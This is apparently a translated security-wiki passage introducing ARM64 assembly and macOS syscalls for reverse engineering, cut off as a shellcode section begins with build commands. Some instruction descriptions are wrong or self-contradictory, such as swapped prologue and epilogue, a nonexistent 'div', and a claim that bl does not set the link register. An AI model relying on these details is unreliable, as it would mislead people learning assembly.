# Вступ до ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Рівні винятків - EL (ARM64v8)**

У архітектурі ARMv8 рівні виконання, відомі як Exception Levels (EL), визначають рівень привілеїв та можливості середовища виконання. Існує чотири рівні винятків, від EL0 до EL3, кожен з яких виконує різні функції:

1. **EL0 - User Mode**:
- Це найменш привілейований рівень і використовується для виконання звичайного коду додатків.
- Додатки, що працюють на EL0, ізольовані один від одного та від системного програмного забезпечення, що підвищує безпеку та стабільність.
2. **EL1 - Operating System Kernel Mode**:
- Більшість ядер операційних систем виконуються на цьому рівні.
- EL1 має більше привілеїв, ніж EL0, і може отримувати доступ до системних ресурсів, але з деякими обмеженнями для забезпечення цілісності системи. Ви переходите з EL0 на EL1 за допомогою інструкції SVC.
3. **EL2 - Hypervisor Mode**:
- Цей рівень використовується для віртуалізації. Гіпервізор, який працює на EL2, може керувати кількома операційними системами (кожна у своєму EL1), що працюють на одному фізичному обладнанні.
- EL2 надає можливості для ізоляції та контролю віртуалізованих середовищ.
- Тому віртуальні машини, такі як Parallels, можуть використовувати `hypervisor.framework` для взаємодії з EL2 і запуску віртуальних машин без необхідності kernel extensions.
- Щоб перейти з EL1 на EL2 використовується інструкція `HVC`.
4. **EL3 - Secure Monitor Mode**:
- Це найпривілейованіший рівень і часто використовується для secure boot та trusted execution environments.
- EL3 може керувати та контролювати доступи між secure та non-secure станами (наприклад secure boot, trusted OS і т.д.).
- Раніше використовувався для KPP (Kernel Patch Protection) у macOS, але зараз вже не використовується.
- EL3 більше не використовується Apple.
- Переходи до EL3 зазвичай виконуються за допомогою інструкції `SMC` (Secure Monitor Call).

Використання цих рівнів дозволяє структуровано й безпечно керувати різними аспектами системи — від користувацьких додатків до найбільш привілейованого системного ПЗ. Підхід ARMv8 до рівнів привілеїв допомагає ефективно ізолювати різні компоненти системи, підвищуючи її безпеку та надійність.

## **Регістри (ARM64v8)**

ARM64 має **31 регістр загального призначення**, позначених як `x0` — `x30`. Кожен може зберігати **64-бітне** (8-байтне) значення. Для операцій, які вимагають лише 32-бітних значень, ті самі регістри можуть використовуватися в 32-бітному режимі з іменами `w0` — `w30`.

1. **`x0`** до **`x7`** — Зазвичай використовуються як scratch-регістри і для передачі параметрів у підпрограми.
- **`x0`** також несе дані повернення функції.
2. **`x8`** - У ядрі Linux `x8` використовується як номер системного виклику для інструкції `svc`. **У macOS використовується `x16`!**
3. **`x9`** до **`x15`** - Більш тимчасові регістри, часто використовуються для локальних змінних.
4. **`x16`** та **`x17`** - **Intra-procedural Call Registers**. Тимчасові регістри для значень immediates. Вони також використовуються для непрямих викликів функцій і PLT (Procedure Linkage Table) заглушок.
- **`x16`** використовується як **номер системного виклику** для інструкції **`svc`** у **macOS**.
5. **`x18`** - **Platform register**. Може використовуватися як регістр загального призначення, але на деяких платформах цей регістр зарезервований для платформо-специфічних потреб: вказівник на блок поточного thread environment у Windows або вказівник на поточну **executing task structure in linux kernel**.
6. **`x19`** до **`x28`** - Це callee-saved регістри. Функція має зберегти значення цих регістрів для викликачa, тому вони зберігаються в стеку і відновлюються перед поверненням до викликачa.
7. **`x29`** - **Frame pointer** для відслідковування стекового фрейму. Коли створюється новий стековий фрейм через виклик функції, регістр **`x29`** **зберігається в стек**, а **нова** адреса frame pointer (адреса `sp`) **зберігається в цьому регістрі**.
- Цей регістр також може використовуватися як регістр загального призначення, хоча зазвичай використовується як посилання на **локальні змінні**.
8. **`x30`** або **`lr`** - **Link register**. Містить **адресу повернення**, коли виконується інструкція `BL` (Branch with Link) або `BLR` (Branch with Link to Register), зберігаючи значення **`pc`** у цьому регістрі.
- Може також використовуватися як будь-який інший регістр.
- Якщо поточна функція викликає нову функцію і тому перезапише `lr`, вона зберігає його в стек на початку — це епілог (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Зберегти `fp` і `lr`, виділити простір і отримати новий `fp`) і відновлює його в кінці — це пролог (`ldp x29, x30, [sp], #48; ret` -> Відновити `fp` і `lr` і повернутися).
9. **`sp`** - **Stack pointer**, використовується для відстеження вершини стеку.
- Значення **`sp`** завжди повинно бути вирівняне принаймні на **quadword**, інакше може виникнути alignment exception.
10. **`pc`** - **Program counter**, який вказує на наступну інструкцію. Цей регістр можна оновлювати лише через генерацію винятків, повернення з винятків та гілкування. Єдині звичайні інструкції, які можуть читати цей регістр — це branch with link інструкції (BL, BLR), що зберігають адресу **`pc`** у **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Також називається **`wzr`** у 32-бітній формі. Може використовуватися для швидкого отримання нульового значення (поширена операція) або для виконання порівнянь за допомогою **`subs`**, наприклад **`subs XZR, Xn, #10`**, коли результат нікуди не зберігається (в **`xzr`**).

Регістри **`Wn`** — це **32-бітна** версія регістрів **`Xn`**.

> [!TIP]
> Регістри від X0 до X18 є змінними (volatile), тобто їх значення можуть змінюватися викликами функцій і перериваннями. Однак регістри від X19 до X28 є незмінними (non-volatile), тобто їх значення повинні зберігатися під час викликів функцій ("callee saved").

### SIMD та регістри для чисел з плаваючою комою

Крім того, існує ще **32 регістри по 128 біт** кожен, які можуть використовуватися для оптимізованих SIMD-операцій і для виконання операцій з плаваючою комою. Вони називаються регістрами Vn, хоча можуть також працювати в **64**-бітному, **32**-бітному, **16**-бітному і **8**-бітному режимах і тоді називаються **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** і **`Bn`**.

### Системні регістри

**Існують сотні системних регістрів**, також званих special-purpose registers (SPRs), які використовуються для **моніторингу** та **керування** поведінкою процесора.\
Їх можна лише читати або записувати за допомогою спеціальних інструкцій **`mrs`** та **`msr`**.

Спеціальні регістри **`TPIDR_EL0`** та **`TPIDDR_EL0`** часто зустрічаються під час зворотного інженірингу. Суфікс `EL0` вказує на **мінімальний рівень винятку**, з якого можна отримати доступ до регістра (у цьому випадку EL0 — це звичайний рівень привілеїв, з яким працюють звичайні програми).\
Вони часто використовуються для збереження **базової адреси області thread-local storage** пам’яті. Зазвичай перший доступний для читання і запису з EL0, а другий можна читати з EL0 і записувати з EL1 (наприклад з ядра).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** містить кілька компонент стану процесу, серіалізованих у спеціальному регістрі, видимому для ОС — **`SPSR_ELx`**, де X — **рівень привілеїв** тригерованого винятку (це дозволяє відновити стан процесу після завершення винятку).\
Доступні поля:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Прапорці умов (**`N`**, **`Z`**, **`C`**, **`V`**):
- **`N`** означає, що операція дала від’ємний результат
- **`Z`** означає, що операція дала нуль
- **`C`** означає, що відбулося перенесення (carry)
- **`V`** означає, що операція дала знакове переповнення:
- Сума двох додатних чисел дає від’ємний результат.
- Сума двох від’ємних чисел дає додатний результат.
- При відніманні, коли від великого від’ємного числа віднімається менше додатне число (або навпаки), і результат не може бути представленим у межах даного розміру бітів.
- Очевидно, процесор не знає, чи операція була знаковою чи ні, тому він перевіряє C і V в операціях і вказує на перенесення у випадку, якщо це було знакове або беззнакове обчислення.

> [!WARNING]
> Не всі інструкції оновлюють ці прапори. Деякі, як **`CMP`** або **`TST`**, оновлюють, і інші з суфіксом s, наприклад **`ADDS`**, теж оновлюють їх.

- Поточний прапор **ширини регістрів (`nRW`)**: Якщо прапор має значення 0, програма після відновлення працюватиме в AArch64 execution state.
- Поточний **Exception Level** (**`EL`**): Звичайна програма, що працює на EL0, матиме значення 0.
- Прапор **single stepping** (**`SS`**): Використовується дебагерами для поетапного виконання — встановивши SS=1 у **`SPSR_ELx`** через виняток, програма виконає крок і згенерує single step exception.
- Прапор **illegal exception state** (**`IL`**): Використовується для маркування, коли привілейований софт виконує недійсний перехід між рівнями винятків; цей прапор встановлюється в 1 і процесор генерує illegal state exception.
- Прапорці **`DAIF`**: Дає можливість привілейованим програмам селективно маскувати певні зовнішні виключення.
- Якщо **`A`** = 1, це означає, що будуть тригеритись asynchronous aborts. **`I`** конфігурує реакцію на зовнішні апаратні Interrupt Requests (IRQs), а `F` стосується Fast Interrupt Requests (FIRs).
- Прапори вибору стекового вказівника (**`SPS`**): Привілейовані програми, що працюють на EL1 і вище, можуть перемикатися між використанням власного регістра стекового вказівника і користувацького (наприклад між `SP_EL1` і `EL0`). Це перемикання виконується записом у спеціальний регістр **`SPSel`**. Зробити це з EL0 неможливо.

## **Конвенція викликів (ARM64v8)**

Конвенція викликів ARM64 визначає, що **перші вісім параметрів** функції передаються в регістрах **`x0`** — **`x7`**. **Додаткові** параметри передаються на **стеку**. **Повернене** значення повертається в регістрі **`x0`**, або також у **`x1`**, якщо воно має 128 біт. Регістри **`x19`** — **`x30`** та **`sp`** повинні бути **збережені** під час викликів функцій.

При читанні функції в асемблері звертайте увагу на **prologue** і **epilogue** функції. **Prologue** зазвичай включає **збереження frame pointer (`x29`)**, **налаштування нового frame pointer** та **виділення простору на стеку**. **Epilogue** зазвичай включає **відновлення збереженого frame pointer** і **повернення** з функції.

### Конвенція викликів у Swift

Swift має власну **calling convention**, яку можна знайти за адресою [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Поширені інструкції (ARM64v8)**

ARM64 інструкції зазвичай мають формат **`opcode dst, src1, src2`**, де **`opcode`** — це операція (наприклад `add`, `sub`, `mov` і т.д.), **`dst`** — регістр-ціль для збереження результату, а **`src1`** і **`src2`** — регістри-джерела. Можна також використовувати immediate-значення замість регістрів-джерел.

- **`mov`**: **Перемістити** значення з одного **реєстру** в інший.
- Приклад: `mov x0, x1` — Це переміщує значення з `x1` в `x0`.
- **`ldr`**: **Завантажити** значення з **пам'яті** в **реєстр**.
- Приклад: `ldr x0, [x1]` — Завантажує значення за адресою, вказаною в `x1`, у `x0`.
- **Offset mode**: Тут вказується зсув, що впливає на початковий вказівник, наприклад:
- `ldr x2, [x1, #8]`, це завантажить у x2 значення з адреси x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, це завантажить у x2 об'єкт з масиву за базою x0, з позиції x1 (index) \* 4
- **Pre-indexed mode**: Це застосує обчислення до origin, отримає результат і також оновить origin.
- `ldr x2, [x1, #8]!`, це завантажить `x1 + 8` в `x2` і запише в x1 результат `x1 + 8`
- `str lr, [sp, #-4]!`, Зберегти link register в sp і оновити регістр sp
- **Post-index mode**: Як попередній, але адреса пам'яті спочатку доступна, а потім обчислюється і зберігається зсув.
- `ldr x0, [x1], #8`, завантажити x1 в x0 і оновити x1 до `x1 + 8`
- **PC-relative addressing**: В цьому випадку адреса для завантаження обчислюється відносно регістру PC
- `ldr x1, =_start`, Це завантажить в x1 адресу символу `_start` відносно поточного PC.
- **`str`**: **Записати** значення з **реєстру** в **пам'ять**.
- Приклад: `str x0, [x1]` — Це запише значення з `x0` у пам'ять за адресою `x1`.
- **`ldp`**: **Load Pair of Registers**. Ця інструкція **завантажує два регістри** з **послідовних адрес** в пам'яті. Адреса пам'яті зазвичай утворюється додаванням зсуву до значення іншого регістру.
- Приклад: `ldp x0, x1, [x2]` — Це завантажує `x0` і `x1` з адрес `x2` і `x2 + 8` відповідно.
- **`stp`**: **Store Pair of Registers**. Інструкція **записує два регістри** у **послідовні адреси** в пам'яті. Адреса зазвичай утворюється додаванням зсуву до значення іншого регістру.
- Приклад: `stp x0, x1, [sp]` — Це запише `x0` і `x1` у пам'ять за адресами `sp` і `sp + 8` відповідно.
- `stp x0, x1, [sp, #16]!` — Це запише `x0` і `x1` у пам'ять за адресами `sp+16` і `sp + 24` відповідно і оновить `sp` до `sp+16`.
- **`add`**: **Додати** значення двох регістрів і зберегти результат у регістрі.
- Синтаксис: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (реєстр або immediate)
- \[shift #N | RRX] -> Виконати зсув або RRX
- Приклад: `add x0, x1, x2` — Додає значення в `x1` і `x2` і зберігає результат в `x0`.
- `add x5, x5, #1, lsl #12` — Це дорівнює 4096 (1 зсунуте вліво на 12) -> 1 0000 0000 0000 0000
- **`adds`** — виконує `add` і оновлює прапори
- **`sub`**: **Відняти** значення двох регістрів і зберегти результат у регістрі.
- Див. синтаксис **`add`**.
- Приклад: `sub x0, x1, x2` — Віднімає `x2` від `x1` і зберігає результат у `x0`.
- **`subs`** — як `sub`, але оновлює прапори
- **`mul`**: **Множення** значень двох регістрів та збереження результату в регістрі.
- Приклад: `mul x0, x1, x2` — Множить `x1` на `x2` і зберігає результат у `x0`.
- **`div`**: **Ділити** значення одного регістру на інший і зберегти результат у регістрі.
- Приклад: `div x0, x1, x2` — Ділить `x1` на `x2` і зберігає результат в `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Додає 0 з кінця, пересуваючи інші біти вперед (множить на степінь двійки)
- **Logical shift right**: Додає 1 на початку, пересуваючи інші біти назад (ділення на степінь двійки для unsigned)
- **Arithmetic shift right**: Як **`lsr`**, але замість додавання 0, якщо найстарший біт = 1, додаються 1 (ділення для signed)
- **Rotate right**: Як **`lsr`**, але те, що видаляється праворуч, додається зліва
- **Rotate Right with Extend**: Як **`ror`**, але з використанням прапора переносу як "найстаршого біта". Тобто прапор переносу переміщується в біт 31, а видалений біт потрапляє в прапор переносу.
- **`bfm`**: **Bit Field Move**, ці операції копіюють біти `0...n` із значення і розміщують їх у позиціях **`m..m+n`**. **`#s`** вказує на **лівий біт**, а **`#r`** — на кількість правого повороту.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Копіює бітове поле з регістру і вставляє його в інший регістр.
- **`BFI X1, X2, #3, #4`** Вставляє 4 біти з X2 починаючи з 3-го біта в X1
- **`BFXIL X1, X2, #3, #4`** Витягає з 3-го біта X2 чотири біти і копіює їх в X1
- **`SBFIZ X1, X2, #3, #4`** Знакове розширення 4 біт з X2 і вставка в X1, починаючи з позиції 3, обнуляючи праві біти
- **`SBFX X1, X2, #3, #4`** Витягає 4 біти, починаючи з біта 3 з X2, розширює знак і поміщає результат в X1
- **`UBFIZ X1, X2, #3, #4`** Нульове розширення 4 біт з X2 і вставка в X1 з позиції 3, обнуляючи праві біти
- **`UBFX X1, X2, #3, #4`** Витягає 4 біти, починаючи з біта 3 з X2, і поміщає нульове розширення в X1.
- **Sign Extend To X:** Розширює знак (або додає 0 у беззнаковій версії) значення, щоб можна було проводити операції з ним:
- **`SXTB X1, W2`** Розширює знак байта **з W2 в X1** (`W2` — половина `X2`) для заповнення 64 біт
- **`SXTH X1, W2`** Розширює знак 16-бітного числа **з W2 в X1** для заповнення 64 біт
- **`SXTW X1, W2`** Розширює знак слова **з W2 в X1** для заповнення 64 біт
- **`UXTB X1, W2`** Додає 0 (unsigned) до байта **з W2 в X1** для заповнення 64 біт
- **`extr`:** Витягає біти із зазначеної **пари регістрів, об'єднаних разом**.
- Приклад: `EXTR W3, W2, W1, #3` Це **конкатенує W1+W2** і бере **від біта 3 W2 до біта 3 W1** і зберігає в W3.
- **`cmp`**: **Порівняти** два регістри і встановити прапорці умов. Це **alias від `subs`**, при якому регістр-ціль встановлюється у нульовий регістр. Корисно для перевірки чи `m == n`.
- Підтримує той же синтаксис, що і `subs`.
- Приклад: `cmp x0, x1` — Порівнює значення в `x0` і `x1` і встановлює прапорці умов відповідно.
- **`cmn`**: **Compare negative** операнда. Це **alias від `adds`** і підтримує той самий синтаксис. Корисно для перевірки чи `m == -n`.
- **`ccmp`**: Умовне порівняння, виконується тільки якщо попереднє порівняння було істинним і спеціально встановлює nzcv біти.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> якщо x1 != x2 і x3 < x4, перейти до func
- Це тому, що **`ccmp`** буде виконано лише якщо попередній `cmp` був `NE`; якщо ні — біти `nzcv` будуть встановлені в 0 (що не задовольнить `blt`).
- Це також можна використовувати як `ccmn` (те ж саме, але негативне, як `cmp` проти `cmn`).
- **`tst`**: Перевіряє, чи будь-які біти в операндах дорівнюють 1 (працює як ANDS без збереження результату). Корисно для перевірки регістра з маскою.
- Приклад: `tst X1, #7` Перевіряє, чи будь-який з останніх 3 біт X1 = 1
- **`teq`**: XOR операція, що відкидає результат
- **`b`**: Безумовний Branch
- Приклад: `b myFunction`
- Зауважте, що це не заповнить link register адресою повернення (не підходить для викликів підпрограм, які потрібно повернутися)
- **`bl`**: **Branch** with link, використовується для **виклику** підпрограми. Зберігає адресу повернення в **`x30`**.
- Приклад: `bl myFunction` — Викликає функцію `myFunction` і зберігає адресу повернення в `x30`.
- Зауважте, що це не заповнює link register з адресою повернення (не підходить для підпрограм, які повинні повертатись) [примітка: дублюється в оригіналі].
- **`blr`**: **Branch** with Link to Register, використовується для **виклику** підпрограми, де ціль вказана в регістрі. Зберігає адресу повернення в `x30`. (Це
- Приклад: `blr x1` — Викликає функцію за адресою в `x1` і зберігає адресу повернення в `x30`.
- **`ret`**: **Повернення** з підпрограми, зазвичай використовуючи адресу в **`x30`**.
- Приклад: `ret` — Повертається з поточної підпрограми, використовуючи адресу повернення в `x30`.
- **`b.<cond>`**: Умовні переходи
- **`b.eq`**: **Переходити якщо рівні**, на підставі попередньої інструкції `cmp`.
- Приклад: `b.eq label` — Якщо попередня інструкція `cmp` виявила рівність, перехід до `label`.
- **`b.ne`**: **Branch if Not Equal**. Перевіряє прапорці умов (встановлені попереднім порівнянням), і якщо значення не рівні, виконує перехід.
- Приклад: Після `cmp x0, x1`, `b.ne label` — Якщо значення в `x0` і `x1` різні, перехід до `label`.
- **`cbz`**: **Compare and Branch on Zero**. Порівнює регістр з нулем і якщо рівні — переходить.
- Приклад: `cbz x0, label` — Якщо значення в `x0` = 0, перехід до `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Порівнює регістр з нулем і якщо не рівні — переходить.
- Приклад: `cbnz x0, label` — Якщо значення в `x0` != 0, перехід до `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Приклад: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Приклад: `tbz x0, #8, label`
- **Умовні операції select**: Операції, поведінка яких залежить від умовних бітів.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Якщо true, X0 = X1, інакше X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Якщо true, Xd = Xn, інакше Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Якщо true, Xd = Xn + 1, інакше Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Якщо true, Xd = Xn, інакше Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Якщо true, Xd = NOT(Xn), інакше Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Якщо true, Xd = Xn, інакше Xd = - Xm
- `cneg Xd, Xn, cond` -> Якщо true, Xd = - Xn, інакше Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Якщо true, Xd = 1, інакше Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Якщо true, Xd = \<all 1>, інакше Xd = 0
- **`adrp`**: Обчислити **адресу сторінки символу** та зберегти її в регістр.
- Приклад: `adrp x0, symbol` — Обчислює адресу сторінки `symbol` і зберігає її в `x0`.
- **`ldrsw`**: **Завантажує** знакове **32-бітне** значення з пам'яті і **знаково розширює** його до 64 біт. Часто використовується для switch-case.
- Приклад: `ldrsw x0, [x1]` — Завантажує знакове 32-бітне значення з адреси в `x1`, знаково розширює до 64 біт і зберігає в `x0`.
- **`stur`**: **Записати значення регістру в пам'ять**, використовуючи зсув від іншого регістру.
- Приклад: `stur x0, [x1, #4]` — Записує значення `x0` у адресу `x1 + 4`.
- **`svc`** : Виконати **системний виклик**. Це означає "Supervisor Call". Коли процесор виконує цю інструкцію, він **переключається з user mode в kernel mode** і переходить до певного місця в пам'яті, де знаходиться код обробки системних викликів ядра.

- Приклад:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Prologue функції**

1. **Зберегти link register і frame pointer у стек**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Встановити новий вказівник кадру**: `mov x29, sp` (встановлює новий вказівник кадру для поточної функції)
3. **Виділити місце в стеку для локальних змінних** (якщо потрібно): `sub sp, sp, <size>` (де `<size>` — кількість потрібних байтів)

### **Епілог функції**

1. **Звільнити пам'ять локальних змінних (якщо вони були виділені)**: `add sp, sp, <size>`
2. **Відновити регістр зв'язку та вказівник кадру**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (повертає керування викликачу, використовуючи адресу в регістрі посилань)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A підтримує виконання 32-бітних програм. **AArch32** може працювати в одному з **двох наборів інструкцій**: **`A32`** та **`T32`**, і може перемикатися між ними через **`interworking`**.\
**Privileged** 64-бітні програми можуть планувати **виконання 32-бітних** програм, виконуючи передачу по рівню винятків до менш привілейованого 32-бітного режиму.\
Зверніть увагу, що перехід з 64-бітного до 32-бітного відбувається із зниженням рівня винятків (наприклад, 64-бітна програма в EL1 викликає програму в EL0). Це робиться шляхом встановлення **біта 4** спеціального регістра **`SPSR_ELx``** **в 1**, коли потік `AArch32` готовий до виконання, а решта `SPSR_ELx` зберігає CPSR програми `AArch32`. Потім привілейований процес викликає інструкцію **`ERET`**, щоб процесор переключився в **`AArch32`**, увійшовши в A32 або T32 залежно від CPSR.

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
Це встановлюється під час **interworking branch instructions,** але також може бути встановлено безпосередньо іншими інструкціями, коли PC встановлено як регістр призначення. Example:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Реєстри

Існує 16 32-бітних регістрів (r0-r15). **From r0 to r14** вони можуть використовуватись для **будь-яких операцій**, проте деякі з них зазвичай резервуються:

- **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)
- **`r14`**: Link Register

Крім того, регістри зберігаються у **`banked registries`**. Це місця, які зберігають значення регістрів і дозволяють виконувати **швидке перемикання контексту** під час обробки винятків та привілейованих операцій, щоб уникнути необхідності вручну зберігати й відновлювати регістри щоразу.\
Це робиться шляхом **збереження стану процесора з `CPSR` у `SPSR`** режиму процесора, до якого відбувається виняток. При поверненні з винятку **`CPSR`** відновлюється зі **`SPSR`**.

### CPSR - Реєстр поточного стану програми

В AArch32 CPSR працює подібно до **`PSTATE`** в AArch64 і також зберігається в **`SPSR_ELx`**, коли відбувається виняток, щоб пізніше відновити виконання:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Поля поділені на кілька груп:

- Application Program Status Register (APSR): арифметичні прапорці і доступний з EL0
- Execution State Registers: поведінка процесу (керується ОС).

#### Application Program Status Register (APSR)

- Прапорці **`N`**, **`Z`**, **`C`**, **`V`** (так само, як в AArch64)
- Прапорець **`Q`**: встановлюється в 1 щоразу, коли під час виконання спеціалізованої операції насиченої арифметики відбувається **integer saturation**. Після встановлення в **`1`** він зберігає це значення, доки вручну не буде встановлений у 0. Крім того, немає інструкції, яка б неявно перевіряла його значення — перевірка повинна виконуватись явно шляхом читання.
- Прапорці **`GE`** (Greater than or equal): використовуються в SIMD (Single Instruction, Multiple Data) операціях, таких як "parallel add" і "parallel subtract". Ці операції дозволяють обробляти кілька елементів даних в одній інструкції.

Наприклад, інструкція **`UADD8`** **додає чотири пари байтів** (з двох 32-бітних операндів) паралельно і зберігає результати в 32-бітному регістрі. Вона також **встановлює прапорці `GE` у `APSR`** на основі цих результатів. Кожен прапорець GE відповідає одній з операцій додавання байтів і показує, чи відбулося **переповнення** для цієї пари байтів.

Інструкція **`SEL`** використовує ці прапорці GE для виконання умовних дій.

#### Execution State Registers

- Біти **`J`** і **`T`**: **`J`** повинен бути 0, і якщо **`T`** = 0 використовується набір інструкцій A32, а якщо 1 — T32.
- **IT Block State Register** (`ITSTATE`): це біти з 10-15 і 25-26. Вони зберігають умови для інструкцій всередині групи з префіксом **`IT`**.
- Біт **`E`**: вказує порядок байтів (endianness).
- Біт(и) режиму та маски винятків (0-4): визначають поточний режим виконання. **5-й** біт вказує, чи програма працює як 32-bit (1) або 64-bit (0). Інші 4 біти представляють **режим винятку, що зараз використовується** (коли відбувся виняток і він обробляється). Встановлене число **вказує поточний пріоритет**, якщо під час обробки виникне інший виняток.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Деякі винятки можна відключити за допомогою бітів **`A`**, `I`, `F`. Якщо **`A`** = 1, це означає, що будуть тригеритись **asynchronous aborts**. **`I`** налаштовує реакцію на зовнішні апаратні **Interrupt Requests** (IRQs), а `F` пов'язаний з **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Перегляньте [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) або виконайте `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls матимуть **x16 > 0**.

### Mach Traps

Подивіться в [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) таблицю `mach_trap_table`, а в [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) — прототипи. Максимальна кількість Mach traps — `MACH_TRAP_TABLE_COUNT` = 128. Mach traps матимуть **x16 < 0**, тому потрібно викликати номери з попереднього списку зі **знаком мінус**: **`_kernelrpc_mach_vm_allocate_trap`** — це **`-10`**.

Також можна переглянути **`libsystem_kernel.dylib`** у дизасемблері, щоб знайти, як викликати ці (та BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the кеш.

> [!TIP]
> Іноді простіше перевірити **декомпільований** код з **`libsystem_kernel.dylib`** **ніж** перевіряти **вихідний код**, бо код кількох syscalls (BSD і Mach) генерується скриптами (див. коментарі у вихідному коді), тоді як у dylib можна знайти те, що викликається.

### machdep calls

XNU підтримує інший тип викликів, що називаються machine dependent. Номери цих викликів залежать від архітектури, і ні виклики, ні їхні номери не гарантовано залишаться сталими.

### comm page

Це сторінка пам'яті, що належить ядру, яка відображається в address space кожного користувацького процесу. Вона призначена для того, щоб зробити перехід з користувацького режиму в kernel space швидшим, ніж використання syscalls для сервісів ядра, які використовуються настільки часто, що цей перехід був би дуже неефективним.

Наприклад виклик `gettimeofdate` читає значення `timeval` безпосередньо з comm page.

### objc_msgSend

Дуже часто цю функцію можна знайти в програмах на Objective-C або Swift. Ця функція дозволяє викликати метод об'єкта Objective-C.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Вказівник на екземпляр
- x1: op -> Селектор методу
- x2... -> Інші аргументи викликаного методу

Отже, якщо ви поставите breakpoint перед переходом до цієї функції, ви легко можете знайти, що викликається в lldb за допомогою (у цьому прикладі об'єкт викликає об'єкт з `NSConcreteTask`, який виконуватиме команду):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Налаштувавши env variable **`NSObjCMessageLoggingEnabled=1`**, можна log коли ця функція викликається у файлі типу `/tmp/msgSends-pid`.
>
> Крім того, встановивши **`OBJC_HELP=1`** і запустивши будь-який binary, ви можете побачити інші environment variables, які можна використовувати щоб **log** коли відбуваються певні Objc-C actions.

Коли ця функція викликається, потрібно знайти викликаний метод для вказаного екземпляра; для цього виконуються такі пошуки:

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

Щоб скомпілювати:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Щоб витягти байти:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
